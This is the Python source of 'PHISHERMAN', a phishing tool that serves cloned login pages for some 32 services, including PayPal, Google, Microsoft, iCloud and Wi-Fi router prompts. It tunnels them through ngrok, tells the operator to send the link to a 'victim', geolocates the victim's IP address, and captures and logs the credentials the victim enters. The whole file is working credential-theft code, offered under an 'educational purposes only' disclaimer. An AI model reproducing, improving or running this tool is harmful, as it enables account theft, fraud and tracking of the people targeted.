#!/Library/Frameworks/Python.framework/Versions/3.8/bin/python3
import subprocess
from sys import exit
from src.termcolor import colored
import platform
from zipfile import ZipFile
from os import walk,path,getcwd
import threading
from datetime import datetime
import json
from src import requests
    
try:
    subprocess.check_output('php -v > /dev/null 2>&1',shell=True)
except:
    print('PLEASE INSTALL PHP BEFORE STARTING PHISHERMAN')
    exit()

def get_my_ip():
    
    return requests.get('https://api.ipify.org/?format=json').content.decode('utf8').split(':')[-1][1:-2]

def ngrok():
    try:
        subprocess.check_output('./ngrok -v > /dev/null 2>&1',shell=True)
        return
    except:
        pass
    if (1):
        print(colored('[*] Preparing to download ngrok','red',attrs=['bold']))
        if platform.system() == 'Darwin':
            r = requests.get('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-darwin-amd64.zip',allow_redirects=True).content
            open('ngrok-zip.zip','wb').write(r)
        else:
            r = requests.get('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip',allow_redirects=True).content
            open('ngrok-zip.zip','wb').write(r)
        with ZipFile('ngrok-zip.zip', 'r') as zip:
            zip.extractall()
    subprocess.Popen(['chmod','+x', 'ngrok'],stdin =subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)
    tkn = input(colored('[*] Please creat an account on https://ngrok.com and enter your authtoken : ','green',attrs=['bold']))
    subprocess.Popen(['./ngrok','authtoken', tkn],stdin =subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)
    subprocess.Popen(['rm','-rf', 'ngrok-zip.zip'],stdin =subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)
    
            
get_link = lambda : "https:"+requests.get('http://127.0.0.1:4040/api/tunnels/command_line').content.decode('utf8').split(',')[2].split(':')[2].strip('"')
start_ngrok = lambda : subprocess.Popen(['./ngrok','http', '3030'],stdin =subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)    
def start_php(server):
    subprocess.Popen(['php','-S', '127.0.0.1:3030','-t','sites/'+server],stdin =subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)

def refresh():
    if 1:
        while 1:
            for root, dirs, files in walk(getcwd()+'/sites/'):
                for file in files:
                    if file in ('ip.txt','redir.txt','victims.txt'):                        
                        open(path.join(root, file),'w+')                        
            else:
                break

def attack(server,url,wifi):
        
    t1 = threading.Thread(target=start_ngrok)
    t2 = threading.Thread(target=start_php,args=[server])
    t1.setDaemon = True
    t2.setDaemon = True
    print()
    print(colored('[*] Starting ngrok....','green',attrs=['bold']))    
    t1.start()    
    print(colored('[*] Starting php server....','green',attrs=['bold']))  
    t2.start()      
    if '/' not in server:        
        open(getcwd()+'/sites/'+server+'/redir.txt','w+').write(url)
    elif wifi:
        open(getcwd()+'/sites/'+server+'/wifi.txt','w+').write(wifi)
    try:        
        my_ip = get_my_ip().strip(' ').strip('\n')
        link = get_link()
    except Exception as e:
        print(colored('[*] Error : could not start ngrok ','red',attrs=['bold']))
        return
    print()
    print(colored('[*] Send this link to victim  :  ','green',attrs=['bold'])+colored(link,'red',attrs=['bold']))
    print()    
    if '/' not in server:
        ztop = 0
        print(colored('[*] Waiting for victim to open the link....','yellow',attrs=['bold']))
        while 1:
            for root, dirs, files in walk(getcwd()+'/sites/'+server):
                for file in files:
                    if 'ip.txt' in file:
                        f = open(path.join(root, file))                    
                        r = f.read().strip(' ').strip('\n')
                        if '.' in r or ':' in r and r not in my_ip:
                            f.seek(0)
                            print()
                            re=f.read()
                            print(colored('[*] Victim has accesed the link','red',attrs=['bold']))
                            print()            
                            ip_details(re)
                            print()
                            ztop = 1
                            f.close()
                            f = open(path.join(root, file),'w+')
                        else:
                            open(path.join(root, file),'w+')
                        f.close()
            if ztop:
                break
    print(colored('[*] Waiting for victim to enter credentials....','yellow',attrs=['bold']))
    ztop = 0
    cred=''
    while 1:
        for root, dirs, files in walk(getcwd()+'/sites/'+server):
            for file in files:
                if 'victims' in file:
                    f = open(path.join(root, file))                    
                    re = f.read()
                    if re:
                        if '<button' not in re:
                            f.seek(0)
                            cred = f.read().split('\n')[0]
                            print(colored('\n[*] Victim credentials \n','red',attrs=['bold']))
                            print(colored(cred,'green',attrs=['bold']))
                            print()
                            ztop = 1
                            f.close()
                            f = open(path.join(root, file),'w+')
                    f.close()                                            
        if ztop:
            break
    subprocess.Popen(['killall','-2', 'ngrok', '>' ,'/dev/null', '2>&1'],stdin =subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)
    subprocess.Popen(['killall','-2', 'php', '>' ,'/dev/null', '2>&1'],stdin =subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)
    f = open('logs.log','a+')
    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    f.write(now + '\n' + server.split('/')[-1].upper() + '\nCREDENTIALS  ->  ' + cred + '\nIP ADDRESS  ->  ' + my_ip + '\n\n')
    f.close()

def ip_details(ip):
    
    headers = {
        "User-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36"
    }
    url = 'http://ip-api.com/json/'+ip.strip('\n')
    r = requests.get(url,headers=headers).content.decode('utf8')
    dic = json.loads(r)
    print('COUNTRY : '+dic['country'])
    print('COUNTRY CODE : '+dic['countryCode'])
    print('REGION : '+dic['regionName'])
    print('CITY : '+dic['city'])
    print('ZIP CODE : '+dic['zip'])
    print('LATITUDE : '+str(dic['lat']))
    print('LONGITUDE : '+str(dic['lon']))
    print('TIMEZONE : '+dic['timezone'])
    print('ISP : '+dic['isp'])
    print('ISP ORGANISATION : '+dic['org'])
    print('AS : '+dic['as']+'\n')
    

def main():    
    
    ngrok()
    s1 = colored('''

[*]  DISCLAIMER : DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE  [*]
                            
                              FOR EDUCATIONAL PURPOSES ONLY

    ''','red',attrs=['bold'])
    s2 = colored('''
             .
           '  \    O_____  _    _ _____  _____ _    _ ______ _____  __  __          _   _ 
         '     \@  |  __ \| |  | |_   _|/ ____| |  | |  ____|  __ \|  \/  |   /\   | \ | |
       '        `\/| |__) | |__| | | | | (___ | |__| | |__  | |__) | \  / |  /  \  |  \| |
     '           __|  ___/|  __  | | |  \___ \|  __  |  __| |  _  /| |\/| | / /\ \ | . ` |
   '           //| | |    | |  | |_| |_ ____) | |  | | |____| | \ \| |  | |/ ____ \| |\  |
 '            // | |_|    |_|  |_|_____|_____/|_|  |_|______|_|  \_\_|  |_/_/    \_\_| \_| v1.0
'~-~-~-~-~-~""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" 

    ''','green',attrs=['bold'])
    s3 = colored('''
              

[1] ADOBE           [11] INSTAGRAM     [21] TWITCH           [31] FLICKR   
[2] AMAZON          [12] LINKEDIN      [22] TWITTER          [32] COINIMP
[3] APPLE ID        [13] MESSENGER     [23] WORDPRESS        [q/Q] QUIT
[4] WIFI            [14] MICROSOFT     [24] YAHOO        
[5] DROPBOX         [15] NETFLIX       [25] EBAY         
[6] FACEBOOK        [16] PAYPAL        [26] ORIGIN
[7] GITHUB          [17] PINTEREST     [27] CRYPTOCOIN
[8] GOOGLE          [18] PROTONMAIL    [28] STACKOVERFLOW    
[9] iCLOUD          [19] SNAPCHAT      [29] NGROK
[10] IGFOLLOWERS    [20] STEAM         [30] REDDIT

''','green',attrs=['bold'])
    print(s1+s2+s3,end='\n\n')
    server_list={
        1 : 'adobe',
        2 : 'amazon',
        3 : 'apple',
        4 : 'wifi',
        5 : 'dropbox',
        6 : 'facebook',
        7 : 'github',
        8 : 'google',
        9 : 'icloud',
        10 : 'igfollowers',
        11 : 'instagram',
        12 : 'linkedin',
        13 : 'messenger',
        14 : 'microsoft',
        15 : 'netflix',
        16 : 'paypal',
        17 : 'pinterest',
        18 : 'protonmail',
        19 : 'snapchat',
        20 : 'steam',
        21 : 'twitch',
        22 : 'twitter',
        23 : 'wordpress',
        24 : 'yahoo',
        25 : 'ebay',
        26 : 'origin',
        27 : 'cryptocoin',
        28 : 'stackoverflow',
        29 : 'ngrok',
        30 : 'reddit',
        31 : 'flickr',
        32 : 'coinimp'
    }
    links = {
        'apple' : 'https://www.apple.com/shop/bag',
        'igfollowers' : 'https://www.instafollowerspro.com/login/login-procc.php',
        'microsoft' : 'https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1616477099&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&id=292666&lw=1&fl=easi2&uiflavor=web&mkt=EN-GB&lc=2057&contextid=34E1E35DF72CFEA1&bk=1616477114&uaid=d0aa0f5716da4260bfd055b0666a726e&pid=0',
        'protonmail' : 'https://mail.protonmail.com/inbox',
        'yahoo' : 'https://login.yahoo.com/account/challenge/password?done=https%3A%2F%2Fwww.yahoo.com%2F&amp;sessionIndex=QQ--&amp;acrumb=8JMZJQox&amp;display=login&amp;authMechanism=primary',
        'instagram' : 'https://www.instagram.com',
        'adobe' : 'https://www.adobe.com/',
        'amazon' : 'https://www.amazon.com',
        'dropbox' : 'https://www.dropbox.com/',
        'facebook' : 'https://www.facebook.com',
        'github' : 'https://www.github.com/',
        'google' : 'https://www.google.com/webhp?hl=en&sa=X&ved=0ahUKEwiur43wqM7vAhX0wTgGHdiYBf8QPAgI',
        'icloud' : 'https://www.icloud.com/',
        'linkedin' : 'https://www.linkedin.com/',
        'messenger' : 'https://www.messenger.com/',
        'netflix' : 'https://www.netflix.com/',
        'paypal' : 'https://www.paypal.com/',
        'pinterest' : 'https://www.pinterest.com/',
        'snapchat' : 'https://www.snapchat.com/',
        'steam' : 'https://store.steampowered.com/',
        'twitch' : 'https://www.twitch.tv/',
        'twitter' : 'https://twitter.com/?lang=en',
        'wordpress' : 'https://wordpress.com/me',
        'ebay' : 'https://www.ebay.com/',
        'origin' : 'https://www.origin.com/en-us/store',
        'cryptocoin' : 'https://www.cryptocoin.pro/',
        'stackoverflow' : 'https://stackoverflow.com/',
        'ngrok' : 'https://ngrok.com/',
        'reddit' : 'https://www.reddit.com/',
        'flickr' : 'https://www.flickr.com',
        'coinimp' : 'https://www.coinimp.com/dashboard',
    }
    while 1:        
        print(colored('[*] Select your choice : ','green',attrs=['bold']),end='')
        ch = input()
        if ch.upper() == 'Q':
            return            
        elif int(ch) in server_list:
            server = server_list[int(ch)]
            break
        else:
            print(colored('[*] Invalid choice','yellow',attrs=['bold']))    
    if server.upper() != 'WIFI':
        r = colored('[*] Enter the URL you want to redirect the victim to (default is homepage of '+server.upper()+') : ','green',attrs=['bold'])    
        print()
        redir_url = input(r)
        if not redir_url:
            redir_url = links[server]
        attack(server,redir_url,'')
    else:
        sub_servers = {
            1 : 'firmware-upgrade',
            2 : 'starbucks-login',
            3 : 'modal-login'
        }
        print(colored('''
                      
[1] FIRMWARE UPGRADE
[2] STARBUCKS LOGIN TO GOOGLE
[3] LOGIN TO WIFI THROUGH MODAL
              
''','green',attrs=['bold']))
        wifi_model = redir_url = ''
        while 1:
            ch_sub = input(colored('[*] Select your choice ','green',attrs=['bold']))
            if ch_sub in '123':
                server += '/'+sub_servers[int(ch_sub)]
                break
            else:
                print(colored('[*] Invalid choice','yellow',attrs=['bold']))
        if ch_sub == '1':
            print()
            wifi_model = input(colored('[*] Enter the model of the target router ','green',attrs=['bold'])).upper()
        elif ch_sub == '3':
            print()
            wifi_model1 = input(colored('[*] Enter the AP name of the target router ','green',attrs=['bold']))
            wifi_model2 = input(colored('[*] Enter the encryption type of the target router ','green',attrs=['bold']))
            wifi_model = wifi_model1.upper()+':'+wifi_model2.upper()
        attack(server,redir_url,wifi_model)

if __name__ == '__main__':
    
    refresh()
    main() 
            
